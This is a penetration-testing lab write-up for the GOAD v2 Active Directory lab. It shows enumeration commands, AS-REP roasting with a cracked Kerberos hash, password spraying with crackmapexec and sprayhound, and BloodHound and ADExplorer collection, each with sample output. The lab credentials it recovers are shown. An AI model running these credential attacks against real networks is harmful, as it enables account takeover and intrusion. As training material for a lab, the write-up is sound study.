# GOAD V2

# Table of contents
- [GOAD V2](#goad-v2)
- [Table of contents](#table-of-contents)
- [Enumeration](#enumeration)
  - [Pre-Access](#pre-access)
    - [Crackmapexec](#crackmapexec)
    - [NMAP](#nmap)
    - [DNS](#dns)
  - [SetUp etc/hosts \& kerberos ( linux ) ( Loading )](#setup-etchosts--kerberos--linux---loading-)
    - [etc/hosts](#etchosts)
    - [SetUp Kerberos in Linux](#setup-kerberos-in-linux)
  - [Anonymous Enumeration](#anonymous-enumeration)
    - [Anonymous User Enum](#anonymous-user-enum)
    - [Anonymous Share Enumeration](#anonymous-share-enumeration)
- [Initial Access](#initial-access)
  - [AS-REP Roasting](#as-rep-roasting)
    - [Linux](#linux)
    - [Windows](#windows)
- [Valid User](#valid-user)
  - [Password Spraying](#password-spraying)
    - [Password Spraying with Heartsbane password](#password-spraying-with-heartsbane-password)
    - [Password Spraying with iseedeadpeople password](#password-spraying-with-iseedeadpeople-password)
    - [Password Spraying with name of the users as password](#password-spraying-with-name-of-the-users-as-password)
      - [Use Sprayhound to avoid this problem](#use-sprayhound-to-avoid-this-problem)
  - [Acces to the organization remotely](#acces-to-the-organization-remotely)
    - [Using Bloodhound with runas ouside the domain](#using-bloodhound-with-runas-ouside-the-domain)
    - [Runas with iseedeadpeople password ( ADExplorer Dump )](#runas-with-iseedeadpeople-password--adexplorer-dump-)
- [Recap of the assesment 12/22/2022](#recap-of-the-assesment-12222022)
- [Bibliography](#bibliography)

# Enumeration

## Pre-Access

Lets start doing some

![Untitled](/assets/images/Untitled.png)

### Crackmapexec

```jsx
crackmapexec smb 192.168.56.1/24
```

![Untitled](/assets/images/Untitled%201.png)

- north.sevenkingdoms.local
    - WINTERFELL → **192.168.56.11**
        - Windows 10 x64
        - (signing:True)
        - (SMBv1:False)
    - CASTELBLACK → **192.168.56.22**
        - Windows 10 x64
        - (signing:False)
            - **don't** require SMB signing. **IMPORTANT**
                - Maybe vuln to NTLM Relay
        - (SMBv1:False)
- sevenkingdoms.local
    - KINGSLANDING → **192.168.56.10**
        - Windows 10 x64
        - (signing:True)
        - (SMBv1:False)
- essos.local
    - MEEREEN → **192.168.56.12**
        - Windows Server 2016
        - (signing:True)
        - (SMBv1:True)
    - BRAAVOS → **192.168.56.23**
        - Windows Server 2016
        - (signing:True)
            - **don't** require SMB signing. **IMPORTANT**
                - Maybe vuln to NTLM Relay
        - (SMBv1:True)
    
    ![Untitled](/assets/images/Untitled%202.png)
    

### NMAP

```powershell
sudo nmap -Pn -sV --top-ports 50 --open -iL init_IPs.txt
```

![Untitled](/assets/images/Untitled%203.png)

![Untitled](/assets/images/Untitled%204.png)

![Untitled](/assets/images/Untitled%205.png)

![Untitled](/assets/images/Untitled%206.png)

![Untitled](/assets/images/Untitled%207.png)

```powershell
nmap -Pn -p- -sC -sV -oA full_scan_goad 192.168.56.10-12,22-23 -T4 --min-rate 2000
	-> Full Scan Enviroment
		-> Carefull with -T4 & --min-rate options, on a REAL assesment are very very noisy
```

[full_scan_goad.xml](/assets/files/full_scan_goad.xml)

![Untitled](/assets/images/Untitled%208.png)

### DNS

```powershell
nslookup -type=srv _ldap._tcp.dc._msdcs.<DOMAIN> <IP>
```

***sevenkingdoms.local*** 

- 192.168.56.10
    
    ![Untitled](/assets/images/Untitled%209.png)
    
- 192.168.56.12
    
    ![Untitled](/assets/images/Untitled%2010.png)
    
- 192.168.56.11
    
    ![Untitled](/assets/images/Untitled%2011.png)
    
    New IP Found —> ***10.0.2.15***
    

3 DCs found.

## SetUp etc/hosts & kerberos ( linux ) ( Loading )

### etc/hosts

```powershell
# GOAD 
192.168.56.22 castelblack.north.sevenkingdoms.local castelblack
192.168.56.10 sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.23 braavos.essos.local braavos
192.168.56.12 essos.local meereen.essos.local meereen                                  
192.168.56.11 winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
```

### SetUp Kerberos in Linux

```powershell
#install kerberos for linux
sudo apt install krb5-user
# realm question
essos.local
# for both servers questions
meereen.essos.local
```

```powershell
#set up the /etc/krb5.conf file

[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        north.sevenkingdoms.local = {
                kdc = winterfell.north.sevenkingdoms.local
                admin_server = winterfell.north.sevenkingdoms.local
        }
        sevenkingdoms.local = {
                kdc = kingslanding.sevenkingdoms.local
                admin_server = kingslanding.sevenkingdoms.local
        }
        essos.local = {
                kdc = meereen.essos.local
                admin_server = meereen.essos.local
        }
        ATHENA.MIT.EDU = {
                kdc = kerberos.mit.edu
                kdc = kerberos-1.mit.edu
                kdc = kerberos-2.mit.edu:88
                admin_server = kerberos.mit.edu
                default_domain = mit.edu
        }
        ZONE.MIT.EDU = {
                kdc = casio.mit.edu
                kdc = seiko.mit.edu
                admin_server = casio.mit.edu
        }
        CSAIL.MIT.EDU = {
                admin_server = kerberos.csail.mit.edu
                default_domain = csail.mit.edu
        }
        IHTFP.ORG = {
                kdc = kerberos.ihtfp.org
                admin_server = kerberos.ihtfp.org
        }
snip
```

## Anonymous Enumeration

Crackmapexec.cmedb command

![Untitled](/assets/images/Untitled%2012.png)

### Anonymous User Enum

```powershell
crackmapexec.cme 192.168.56.11 --users
```

1. north.sevenkingdoms.local\\**Guest**       ->      Built-in account for guest access to the computer/domain
2. north.sevenkingdoms.local\\**arya.stark**   ->     Arya Stark
3. north.sevenkingdoms.local\\**sansa.stark**  ->   Sansa Stark
4. north.sevenkingdoms.local\\**brandon.stark**-> Brandon Stark
5. north.sevenkingdoms.local\\**rickon.stark** ->    Rickon Stark
6. north.sevenkingdoms.local\\**hodor**        ->      Brainless Giant
7. north.sevenkingdoms.local\\**jon.snow**     ->    Jon Snow
8. north.sevenkingdoms.local\\**samwell.tarly**->   Samwell Tarly (**Password : Heartsbane**)
9. north.sevenkingdoms.local\\**jeor.mormont** -> Jeor Mormont
10. north.sevenkingdoms.local\\**sql_svc**     ->      sql service

```powershell
net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

```powershell
NORTH\Administrator
NORTH\vagrant
NORTH\krbtgt
NORTH\SEVENKINGDOMS$
NORTH\arya.stark
NORTH\eddard.stark
NORTH\catelyn.stark
NORTH\robb.stark
NORTH\sansa.stark
NORTH\brandon.stark
NORTH\rickon.stark
NORTH\hodor
NORTH\jon.snow
NORTH\samwell.tarly
NORTH\jeor.mormont
NORTH\sql_svc
```

```powershell
rpcclient -U "SPACEX\\" 192.168.56.11 -N

					-> SPACEX is a CUSTOM NetBios ( name )

user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]
```

### Anonymous Share Enumeration

I found some Shares with ***Read,Write*** Permission.

```powershell
crackmapexec.cme smb 192.168.56.10-23 -u 'a' -p '' --shares
```

![Untitled](/assets/images/Untitled%2013.png)

Another way

```powershell
smbclient -L \\<domain name> -I <target IP> -N
```

![Untitled](/assets/images/Untitled%2014.png)

![Untitled](/assets/images/Untitled%2015.png)

# Initial Access

## AS-REP Roasting

### Linux

Im using the tool [`Arsenal`](https://github.com/Orange-Cyberdefense/arsenal) from **Orange Ciberdefense** to makes easier to understand the command.

![GetNPUsers its a tool from impacket to find AS-REP Roastable Users on a Domain.](/assets/images/Untitled%2016.png)

GetNPUsers its a tool from impacket to find AS-REP Roastable Users on a Domain.

- krb-users.txt file has all the Users we found before on 192.168.56.11.
    - DC02 - WINTERFELL
        - north.sevenkingdoms.local

![We found a hash that has been the session key encrypted with the hash of the user's password](/assets/images/Untitled%2017.png)

We found a hash that has been the session key encrypted with the hash of the user's password

We export on hashcat format bc for the future password cracking.
This script has 2 format values:

- Hashcat
- John

**Hascat Command**

```powershell
hashcat -a 0 -m 18200 ASREP-users-DC02.txt /snap/seclists/current/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

```powershell
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 175 MB

Dictionary cache built:
* Filename..: /snap/seclists/current/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
* Passwords.: 999998
* Bytes.....: 8529108
* Keyspace..: 999998
* Runtime...: 0 secs

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:a2b193bd4fe5e0cde22c962b5fcb843a$27816ca06c978394228e79db0f4e0af77e58f839355faee41486405b8cbd197cc61a32d750424e4aa5a76d596e48f0d2b41efebaeabd527715f8d12396b474e6a0fdcfa175a2f5fdb359712263bebcf27e751e13d0bd26e3001af0605505e3928e5ce63e185e7fe129bc83375cb09b789a3ada67fb10363162f791ef032142ae932197e9efe269af5c5cd514f24df52c5e62e4cd3ca84096091c7c1d3027069fa921f323fdc84f43dd15b09e0349c38e2d72c04be6d3bef2b26f94450f47af5fb7972e3b1edd795f2e950377e8794961837619a963d32b22c6476b0f5650042990065c31f3d07632d8eac3cba26a367124098c7ba658957e7cf2889facad22a668f6077dd929:iseedeadpeople
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...7dd929
Time.Started.....: Mon Dec 19 23:27:57 2022 (0 secs)
Time.Estimated...: Mon Dec 19 23:27:57 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/snap/seclists/current/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17947.0 kH/s (6.91ms) @ Accel:512 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 327680/999998 (32.77%)
Rejected.........: 0/327680 (0.00%)
Restore.Point....: 0/999998 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> boogaa
Hardware.Mon.#1..: Temp: 55c Fan: 38% Util:  6% Core:1873MHz Mem:4513MHz Bus:16

Started: Mon Dec 19 23:27:56 2022
Stopped: Mon Dec 19 23:27:58 2022
```

Password: `iseedeadpeople`.

### Windows

# Valid User 

## Password Spraying

### Password Spraying with Heartsbane password

```bash
crackmapexec smb ips.txt -u krb-users.txt -p Heartsbane
```

![Heartsbane](../assets/images/pwdHeart.png)

### Password Spraying with iseedeadpeople password

```bash
crackmapexec smb ips.txt -u krb-users.txt -p iseedeadpeople
```

![People](../assets/images/pwdPeople.png)

### Password Spraying with name of the users as password

```bash
crackmapexec smb ips.txt -u krb-users.txt -p krb-users.txt
```
![Users](../assets/images/pwdUsers.png)

> DANGER DANGER DANGER can LOCK the account bc the number of attempts
#### Use Sprayhound to avoid this problem

```bash
sprayhound -U krb-users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower -t 2
```

![Sprayhound](../assets/images/sprayhound.png)


## Acces to the organization remotely

### Using Bloodhound with runas ouside the domain

First I boot a Windows 10 VM and I prepare de `/etc/hosts` file to resolve the domain name.
> This machine is complety isolated from the network.

We know:
  - Ip of the Domain Controller `DC02`: **192.168.56.11**
  - The domain name: **north.sevenkingdoms.local**

At this point we are going to use the tool `runas` to get a shell with the user `brandon.stark` and the password `iseedeadpeople`.

```cmd
runas /netonly /user:north.sevenkingdoms.local\brandon.stark "powershell.exe"
```

![We have a shell with the user brandon.stark](/assets/images/runas.png)

> We have a shell with the user brandon.stark

We can run now sharphound to get the information of the domain.

```cmd
.\SharpHound.exe --CollectionMethod All -d north.sevenkingdoms.local --domaincontroller 192.168.56.11
```

![SharpHound](/assets/images/sharhound.png)

> `--CollectionMethod All` is **NOISE AF** on a real assesment bc it do a lot of **LDAP queries**.
> > U should optimize the query as u want to be more stealthy on a real assesment.

### Runas with iseedeadpeople password ( ADExplorer Dump )
> A little bit noise on a real assesment but a better way than `--CollectionMethod All` Bloodhound option.

First I boot a Windows 10 VM and I prepare de `/etc/hosts` file to resolve the domain name.
> This machine is complety isolated from the network.

We know:
  - Ip of the Domain Controller `DC02`: **192.168.56.11**
  - The domain name: **north.sevenkingdoms.local**

At this point we are going to use the tool `runas` to get a shell with the user `brandon.stark` and the password `iseedeadpeople`.

```cmd
runas /netonly /user:north.sevenkingdoms.local\brandon.stark "powershell.exe"
```

![We have a shell with the user brandon.stark](/assets/images/runas.png)

> We have a shell with the user brandon.stark

Here we can see the user `brandon.stark` has the permission to run `powershell.exe` as administrator.

Now we can use `ADExplorer` on the context of the user `brandon.stark` as we are inside the domain with a valid machine.

![ADExplorer](/assets/images/ADexplorerRemotly.png)

We are going to create a Snapshot with `ADExplorer` because we are going to use it later using [`ADExplorerSnapshot.py`](https://github.com/c3c/ADExplorerSnapshot.py).

![ADExplorerSnapshot](/assets/images/snapshot.png)

This tool is going to parse the snapshot to use the info on bloodhound.

```bash
python3 ../../Downloads/ADExplorerSnapshot.py/ADExplorerSnapshot.py ../GOAD_v2_WriteUp_by_Helix/assets/files/DC02.dat
```

![ADExplorerSnapshot](/assets/images/ADexplorerSnapshot.png)

> **IMPORTANT**: We need to use **4.1.0** version of **Bloodhound** because the latest version has a bug with the `ADExplorerSnapshot.py` tool.

![jsonFIles](/assets/images/json_files.png)
> We have the json files to use with bloodhound

**Bloodhound**

![bloodhound](/assets/images/bloodHoundCap.png)

# Recap of the assesment 12/22/2022

List of the important info we gathered:

  - Users and passwords:
    - samwell.tarly:Heartsbane 
      - `User description`
    - brandon.stark:iseedeadpeople 
      - `Asreproasting`
    - hodor:hodor 
      - Password Spraying using `SPRAYHOUND`
   - AD dumped with `ADExplorer` and `ADExplorerSnapshot.py` tool
     - Bloodhound graph

# Bibliography

[Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

[lsassy](https://github.com/Hackndo/lsassy)